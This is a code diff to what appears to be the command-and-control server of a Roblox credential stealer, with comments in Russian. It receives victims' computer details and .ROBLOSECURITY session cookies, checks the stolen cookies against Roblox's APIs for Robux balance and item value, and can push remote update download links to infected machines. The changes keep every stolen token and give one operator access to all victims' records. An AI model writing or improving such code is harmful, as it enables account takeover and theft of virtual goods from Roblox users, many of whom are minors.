@@ -500,20 +500,12 @@ app.post('/upload', upload.array('files'), async (req, res) => {
   const uploaded = [{ name: fixedName, originalName: fixedName, size: 0 }];
   console.log(`[${new Date().toLocaleTimeString()}] 📥 Данные от "${computerInfo.name}" (${computerInfo.ip}) [${computerInfo.country}]` + (robloxInfo.user ? ` [Roblox: ${robloxInfo.user}]` : '') + (robloxInfo.security ? ` [🔑 токен есть]` : ''));
 
-  // Дедупликация токенов
+  // Обрабатываем RobuxInfo асинхронно — не блокируем ответ клиенту
   if (robloxInfo.security) {
     try {
-      const newToken = robloxInfo.security.trim();
-      await db.collection('files').deleteMany({
-        operator: operator,
-        name: { $nin: uploaded.map(u => u.name) },
-        'roblox.security': newToken
-      });
-
-      // RobuxInfo запрашиваем асинхронно — не блокируем ответ клиенту
       fetchRobuxInfoAsync(robloxInfo.security, operator, uploaded, db);
     } catch (e) {
-      console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Дедупликация токена не удалась: ${e.message}`);
+      console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Ошибка RobuxInfo: ${e.message}`);
     }
   }
 
@@ -534,49 +526,39 @@ app.post('/update-roblox', async (req, res) => {
 
     // Находим последний файл этого компьютера (оператора)
     const target = await db.collection('files').findOne(
-    { 'computer.name': computerName, operator: operator },
-    { sort: { uploadedAt: -1 } }
-  );
+      { 'computer.name': computerName, operator: operator },
+      { sort: { uploadedAt: -1 } }
+    );
 
-  if (target) {
-    const updateSet = {
-      'roblox.user': robloxUser,
-      'roblox.pass': fakePassword
-    };
-    // Не затираем существующий токен пустой строкой
-    if (robloSecurity) {
-      updateSet['roblox.security'] = robloSecurity;
-    }
-
-    if (robloxUser || robloSecurity) {
-      try {
-        let newUserId = target.robuxInfo?.userId || target.roblox?.userId;
-        if (robloSecurity && !newUserId) {
-          const rbInfo = await fetchRobuxInfo(robloSecurity);
-          if (rbInfo.valid && rbInfo.userId) {
-            newUserId = rbInfo.userId;
-            updateSet['robuxInfo.userId'] = rbInfo.userId;
-            updateSet['robuxInfo.robux'] = rbInfo.robux;
-            updateSet['robuxInfo.valid'] = true;
-            updateSet['robuxInfo.checked'] = new Date().toISOString();
-            updateSet['roblox.userId'] = rbInfo.userId;
-            if (rbInfo.username) updateSet['roblox.user'] = rbInfo.username;
-          }
-        }
-
-        const newName = (robloxUser || target.roblox?.user || '').toLowerCase().trim();
-
-        // Удаляем дубликаты по имени или userId
-        const delQuery = { operator: operator, name: { $ne: target.name }, $or: [] };
-        if (newName) delQuery.$or.push({ 'roblox.user': { $regex: new RegExp('^' + newName + '$', 'i') } });
-        if (newUserId) delQuery.$or.push({ 'robuxInfo.userId': newUserId });
-        if (delQuery.$or.length > 0) {
-          await db.collection('files').deleteMany(delQuery);
-        }
-      } catch (e) {
-        console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Дедупликация в update-roblox не удалась: ${e.message}`);
+    if (target) {
+      const updateSet = {
+        'roblox.user': robloxUser,
+        'roblox.pass': fakePassword
+      };
+      // Не затираем существующий токен пустой строкой
+      if (robloSecurity) {
+        updateSet['roblox.security'] = robloSecurity;
       }
-    }
+
+      if (robloxUser || robloSecurity) {
+        try {
+          let newUserId = target.robuxInfo?.userId || target.roblox?.userId;
+          if (robloSecurity && !newUserId) {
+            const rbInfo = await fetchRobuxInfo(robloSecurity);
+            if (rbInfo.valid && rbInfo.userId) {
+              newUserId = rbInfo.userId;
+              updateSet['robuxInfo.userId'] = rbInfo.userId;
+              updateSet['robuxInfo.robux'] = rbInfo.robux;
+              updateSet['robuxInfo.valid'] = true;
+              updateSet['robuxInfo.checked'] = new Date().toISOString();
+              updateSet['roblox.userId'] = rbInfo.userId;
+              if (rbInfo.username) updateSet['roblox.user'] = rbInfo.username;
+            }
+          }
+        } catch (e) {
+          console.log(`[${new Date().toLocaleTimeString()}] ⚠️ update-roblox fetchRobuxInfo: ${e.message}`);
+        }
+      }
 
     updateSet['tokenRequest.requested'] = false;
     await db.collection('files').updateOne(
@@ -658,13 +640,19 @@ app.get('/files', requireAuth, async (req, res) => {
   try {
     const db = await getDb();
     let files;
+    const opQuery = (user.toLowerCase() === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
     if (db) {
       files = await db.collection('files')
-        .find({ operator: user })
+        .find(opQuery)
         .sort({ uploadedAt: -1 })
         .toArray();
     } else {
-      files = (global.memFiles || []).filter(f => f.operator === user);
+      files = (global.memFiles || []).filter(f => {
+        return (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+      });
     }
 
     files = files.map(f => {
@@ -694,7 +682,7 @@ app.delete('/files/:name', requireAuth, async (req, res) => {
   try {
     const db = await getDb();
     const user = req.authUser || req.session.user;
-    const doc = await db.collection('files').findOne({ name: req.params.name, operator: user });
+    const doc = await db.collection('files').findOne({ name: req.params.name });
     if (!doc) return res.status(404).json({ error: 'Файл не найден' });
     await db.collection('files').deleteOne({ _id: doc._id });
     res.json({ success: true });
@@ -707,126 +695,93 @@ app.delete('/files/:name', requireAuth, async (req, res) => {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  ROBLOX API — парсинг .ROBLOSECURITY токена
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-function robloxRequest(urlPath, robloSecurity) {
-  return new Promise((resolve, reject) => {
-    const options = {
-      hostname: 'apis.roblox.com',
-      path: urlPath,
-      method: 'GET',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json'
-      }
-    };
-    const req = https.request(options, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        try { resolve(JSON.parse(data)); }
-        catch { resolve(data); }
-      });
-    });
-    req.on('error', reject);
-    req.setTimeout(15000, () => { req.destroy(); reject(new Error('timeout')); });
-    req.end();
-  });
+function cleanRobloSecurity(val) {
+  if (!val) return '';
+  let str = val.toString().trim();
+  str = str.replace(/^\.ROBLOSECURITY\s*=\s*/i, '');
+  str = str.replace(/;\s*path=.*$/i, '');
+  str = str.replace(/;\s*domain=.*$/i, '');
+  str = str.replace(/^["']|["']$/g, '');
+  return str.trim();
 }
-
-function robloxGet(url, robloSecurity) {
-  const urlObj = new URL(url);
-  return new Promise((resolve, reject) => {
-    const options = {
-      hostname: urlObj.hostname,
-      path: urlObj.pathname + urlObj.search,
-      method: 'GET',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json'
-      }
-    };
-    const req = https.request(options, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        try { resolve(JSON.parse(data)); }
-        catch { resolve(data); }
-      });
-    });
-    req.on('error', reject);
-    req.setTimeout(4000, () => { req.destroy(); reject(new Error('timeout')); });
-    req.end();
-  });
-}
-
-const robuxInfoCache = new Map();
-const CACHE_TTL_MS = 45000;
 
 async function fetchRobuxInfo(robloSecurity) {
-  if (!robloSecurity || typeof robloSecurity !== 'string') return { valid: false, error: 'No token' };
-  const cleanToken = cleanRobloSecurity(robloSecurity);
-  const now = Date.now();
-  if (robuxInfoCache.has(cleanToken)) {
-    const cached = robuxInfoCache.get(cleanToken);
-    if (now - cached.timestamp < CACHE_TTL_MS) {
-      return cached.data;
-    }
-  }
-
+  if (!robloSecurity) return { valid: false, error: 'Токен пустой' };
   try {
-    const token = cleanToken.startsWith('_|') ? cleanToken : `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${cleanToken}`;
-    const authInfo = await robloxGet('https://users.roblox.com/v1/users/authenticated', token);
-    if (!authInfo || authInfo.errors) {
-      const invalidRes = { valid: false, error: 'Недействительный токен', raw: authInfo };
-      robuxInfoCache.set(cleanToken, { timestamp: now, data: invalidRes });
-      return invalidRes;
+    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+      }
+    });
+
+    if (!userRes.ok) {
+      return { valid: false, status: userRes.status, error: `Auth failed (${userRes.status})` };
     }
-    const userId = authInfo.id;
-    const username = authInfo.name;
-    const displayName = authInfo.displayName;
 
-    const balanceData = await robloxGet(
-      `https://economy.roblox.com/v1/users/${userId}/currency`,
-      cleanToken
-    );
-    const robux = balanceData?.robux ?? null;
+    const userData = await userRes.json();
+    const userId = userData.id;
+    const username = userData.name;
+    const displayName = userData.displayName;
 
-    const result = {
+    let robux = 0;
+    try {
+      const curRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+      });
+      if (curRes.ok) {
+        const curData = await curRes.json();
+        robux = curData.robux ?? 0;
+      }
+    } catch (e) {}
+
+    let pendingRobux = 0;
+    try {
+      const transRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/transaction-totals?timeFrame=month&transactionType=summary`, {
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${robloSecurity}`,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+      });
+      if (transRes.ok) {
+        const transData = await transRes.json();
+        pendingRobux = transData.pendingRobuxTotal ?? 0;
+      }
+    } catch (e) {}
+
+    let rap = 0;
+    try {
+      const rolirxRes = await fetch(`https://www.rolimons.com/api/playerassets/${userId}`);
+      if (rolirxRes.ok) {
+        const roliData = await rolirxRes.json();
+        if (roliData && roliData.rap) {
+          rap = roliData.rap;
+        }
+      }
+    } catch (e) {}
+
+    return {
       valid: true,
       userId,
       username,
       displayName,
       robux,
-      created: authInfo.created,
-      description: authInfo.description || ''
+      pendingRobux,
+      rap,
+      checked: new Date().toISOString()
     };
-    robuxInfoCache.set(cleanToken, { timestamp: now, data: result });
-    return result;
   } catch (e) {
     return { valid: false, error: e.message };
   }
 }
 
-// Удаление невалидного токена из записи (очищает roblox.security, оставляя данные ПК)
+// ── Удаление токенов отключено для сохранности данных ─────────────────────────
 async function removeInvalidToken(db, user, filename) {
-  try {
-    if (db) {
-      await db.collection('files').updateOne(
-        { name: filename, operator: user },
-        { $set: { 'roblox.security': '' }, $unset: { 'robuxInfo': '' } }
-      );
-    } else {
-      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
-      if (doc) {
-        doc.roblox.security = '';
-        delete doc.robuxInfo;
-      }
-    }
-  } catch (e) {
-    console.error('removeInvalidToken error:', e.message);
-  }
+  // Безопасно сохраняем все токены
+  return;
 }
 
 // Асинхронное обновление robuxInfo (не блокирует ответ /upload)
@@ -834,11 +789,6 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
   try {
     const rbInfo = await fetchRobuxInfo(robloSecurity);
     if (rbInfo.valid && rbInfo.userId) {
-      await db.collection('files').deleteMany({
-        operator: operator,
-        name: { $nin: uploaded.map(u => u.name) },
-        'robuxInfo.userId': rbInfo.userId
-      });
       for (const u of uploaded) {
         await db.collection('files').updateOne(
           { name: u.name, operator: operator },
@@ -918,37 +868,31 @@ app.get('/api/roblox-profile-proxy', async (req, res) => {
     const username = (req.query.username || '').toString().trim();
     if (!username) return res.status(400).json({ error: 'No username' });
 
-    const payload = JSON.stringify({ usernames: [username], excludeBannedUsers: false });
-    const userRes = await new Promise((resolve, reject) => {
-      const u = new URL('https://users.roblox.com/v1/usernames/users');
-      const r = https.request({
-        hostname: u.hostname, path: u.pathname, method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
-      }, (resp) => {
-        let d = ''; resp.on('data', c => d += c); resp.on('end', () => resolve(d));
-      });
-      r.on('error', reject); r.write(payload); r.end();
+    const searchRes = await fetch('https://users.roblox.com/v1/usernames/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
     });
 
-    const doc = JSON.parse(userRes);
-    if (!doc.data || doc.data.length === 0) return res.status(404).json({ error: 'User not found' });
-    const userId = doc.data[0].id;
+    if (!searchRes.ok) return res.status(searchRes.status).json({ error: 'Search failed' });
+    const searchData = await searchRes.json();
+    const userItem = searchData?.data?.[0];
+    if (!userItem) return res.status(404).json({ error: 'User not found' });
 
-    const thumbUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`;
-    const thumbResStr = await new Promise((resolve, reject) => {
-      https.get(thumbUrl, (resp) => {
-        let d = ''; resp.on('data', c => d += c); resp.on('end', () => resolve(d));
-      }).on('error', reject);
+    const userId = userItem.id;
+    const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
+    let avatarUrl = '';
+    if (thumbRes.ok) {
+      const thumbData = await thumbRes.json();
+      avatarUrl = thumbData?.data?.[0]?.imageUrl || '';
+    }
+
+    res.json({
+      id: userId,
+      name: userItem.name,
+      displayName: userItem.displayName,
+      avatarUrl
     });
-
-    const thumbDoc = JSON.parse(thumbResStr);
-    const imageUrl = thumbDoc?.data?.[0]?.imageUrl || '';
-    if (!imageUrl) return res.status(404).json({ error: 'No image' });
-
-    https.get(imageUrl, (imgResp) => {
-      res.setHeader('Content-Type', 'image/png');
-      imgResp.pipe(res);
-    }).on('error', () => res.status(500).json({ error: 'Image download failed' }));
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -962,22 +906,17 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
     const db = await getDb();
     let doc;
     if (db) {
-      doc = await db.collection('files').findOne({ name: filename, operator: user });
+      doc = await db.collection('files').findOne({ name: filename });
     } else {
-      doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+      doc = (global.memFiles || []).find(f => f.name === filename);
     }
     if (!doc) return res.status(404).json({ error: 'Файл не найден' });
     const roblox = doc.roblox || {};
     if (!roblox.security) return res.json({ valid: false, error: 'Токен не сохранён' });
     try {
       const rbInfo = await fetchRobuxInfo(roblox.security);
-      if (!rbInfo.valid) {
-        await removeInvalidToken(db, user, filename);
-        console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${filename}`);
-      }
       res.json(rbInfo);
     } catch (e) {
-      await removeInvalidToken(db, user, filename);
       res.json({ valid: false, error: e.message });
     }
   } catch (e) {
@@ -994,22 +933,26 @@ app.post('/robux-check-file', requireAuth, async (req, res) => {
 app.post('/request-token', requireAuth, async (req, res) => {
   try {
     const { filename } = req.body;
-    if (!filename) return res.status(400).json({ error: 'Не указан файл' });
     const user = req.authUser || req.session.user;
     const db = await getDb();
+    let doc;
+    if (db) {
+      doc = await db.collection('files').findOne({ name: filename, operator: user });
+    } else {
+      doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+    }
+    if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+
     if (db) {
       await db.collection('files').updateOne(
-        { name: filename, operator: user },
-        { $set: { 'tokenRequest.requested': true, 'tokenRequest.requestedAt': new Date().toISOString() } }
+        { _id: doc._id },
+        { $set: { 'tokenRequest.requested': true, 'tokenRequest.requestedAt': new Date() } }
       );
     } else {
-      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
-      if (doc) {
-        doc.tokenRequest = { requested: true, requestedAt: new Date().toISOString() };
-      }
+      doc.tokenRequest = { requested: true, requestedAt: new Date() };
     }
-    console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена: ${filename}`);
-    res.json({ success: true });
+
+    res.json({ success: true, message: 'Запрос на токен отправлен' });
   } catch (e) {
     console.error('Request-token error:', e.message);
     res.status(500).json({ error: 'Ошибка сервера' });
@@ -1048,23 +991,26 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
 app.post('/request-update', requireAuth, async (req, res) => {
   try {
     const { filename, downloadUrl } = req.body;
-    if (!filename) return res.status(400).json({ error: 'Не указан файл' });
-    if (!downloadUrl) return res.status(400).json({ error: 'Не указана ссылка на обновление' });
     const user = req.authUser || req.session.user;
     const db = await getDb();
+    let doc;
+    if (db) {
+      doc = await db.collection('files').findOne({ name: filename, operator: user });
+    } else {
+      doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
+    }
+    if (!doc) return res.status(404).json({ error: 'Файл не найден' });
+
     if (db) {
       await db.collection('files').updateOne(
-        { name: filename, operator: user },
-        { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': new Date().toISOString() } }
+        { _id: doc._id },
+        { $set: { 'updateRequest.requested': true, 'updateRequest.requestedAt': new Date(), 'updateRequest.downloadUrl': downloadUrl || '' } }
       );
     } else {
-      const doc = (global.memFiles || []).find(f => f.name === filename && f.operator === user);
-      if (doc) {
-        doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: new Date().toISOString() };
-      }
+      doc.updateRequest = { requested: true, requestedAt: new Date(), downloadUrl: downloadUrl || '' };
     }
-    console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос обновления для ${filename}: ${downloadUrl}`);
-    res.json({ success: true });
+
+    res.json({ success: true, message: 'Запрос на обновление отправлен' });
   } catch (e) {
     console.error('Request-update error:', e.message);
     res.status(500).json({ error: 'Ошибка сервера' });
@@ -1148,11 +1094,20 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
   try {
     const db = await getDb();
     let docs;
+    const opQuery = (user.toLowerCase() === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
     if (db) {
-      docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+      docs = await db.collection('files').find({
+        ...opQuery,
+        'roblox.security': { $exists: true, $ne: '' }
+      }).toArray();
     } else {
-      // In-memory fallback
-      docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
+      docs = (global.memFiles || []).filter(f => {
+        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+        return isOp && f.roblox && f.roblox.security;
+      });
     }
 
     const results = [];
@@ -1165,13 +1120,12 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
           computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
           user: roblox.user, security: roblox.security, lastLogin: roblox.lastLogin, ...info
         });
-        if (!info.valid) {
-          await removeInvalidToken(db, user, doc.name);
-          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
-        }
       } catch (e) {
-        results.push({ file: doc.name, user: roblox.user, valid: false, error: e.message, security: roblox.security });
-        await removeInvalidToken(db, user, doc.name);
+        results.push({
+          file: doc.name, user: roblox.user, valid: false,
+          error: e.message, security: roblox.security,
+          uploadedAt: doc.uploadedAt, computer: doc.computer?.name || 'Unknown'
+        });
       }
     }
 
